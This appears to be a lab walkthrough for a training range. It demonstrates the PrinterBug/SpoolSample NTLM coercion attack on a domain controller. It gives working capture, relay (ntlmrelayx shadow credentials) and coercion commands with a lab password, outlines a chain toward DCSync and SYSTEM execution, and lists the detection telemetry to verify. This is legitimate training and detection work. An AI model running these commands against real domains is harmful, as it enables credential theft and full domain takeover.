# WT#017 — PrinterBug (SpoolSample)

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01.cadre.local) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | dementor.py, coercer, impacket |
| **Certifications** | CRTE, CAPE |
| **MITRE ATT&CK** | T1187 |
| **Difficulty** | Easy |

## Prerequisites
- Valid domain credentials for any domain user
- MS-RPRN Print Spooler service running on dc01 (default on Server 2025)
- Network connectivity from Kali (192.168.77.41) to dc01 (192.168.77.10)
- Attacker-controlled SMB listener on Kali to capture the incoming NTLM authentication

## Attack Steps

### Step 1: Start NTLM capture listener
Start `impacket-ntlmrelayx` or `Responder` in capture mode on Kali to receive the coerced NetNTLM hash.

```bash
# Option A — Capture only (dump hash):
sudo impacket-smbserver -smb2support share /dev/null

# Option B — Relay for further exploitation (see WT#021 or WT#022):
impacket-ntlmrelayx -t ldap://dc01.cadre.local --shadow-credentials --escalate-user ops_redcell
```

### Step 2: Trigger the coercion using dementor.py
```bash
python3 dementor.py 192.168.77.41 dc01.cadre.local -d cadre.local -u analyst_dfir -p An@lyst_DF1R!
```

### Step 3: Alternative — Trigger using coercer
```bash
coercer coerce -l 192.168.77.41 -t 192.168.77.10 -d cadre.local -u analyst_dfir -p An@lyst_DF1R! --spoolsample
```

### Step 4: Verify captured authentication
Check your SMB/relay listener for incoming NTLM authentication from `dc01$@CADRE.LOCAL`.

## Post-Exploitation Chain
- Captured NetNTLM hash of dc01$ can be relayed to LDAP on dc01 (WT#021) → Shadow Credentials → DCSync
- Or relayed to SMB on mbr02 (WT#022) for SYSTEM-level code execution
- Or cracked offline with hashcat (mode 5600) if relay is not possible

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (dc01)** | Event 4662 (Object Type: `MS-RPRN`), Event 5156 (outbound SMB connection to Kali) |
| **Sysmon (dc01)** | Event 3 (network connection from dc01 to Kali port 445), Event 1 (spoolsv.exe process) |
| **Zeek (monitor)** | `smb_files.log`, `smb_mapping.log` showing dc01$ connecting to Kali |
| **Suricata (monitor)** | SMB coercion / named pipe alerts (spoolss pipe access) |
| **Arkime (monitor)** | Full PCAP of SMB coercion traffic between dc01 and Kali |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*`, `logs-zeek.smb-*` |

## Status
**CONFIGURED** — Print Spooler enabled on dc01. Coercer tools installed on Kali.
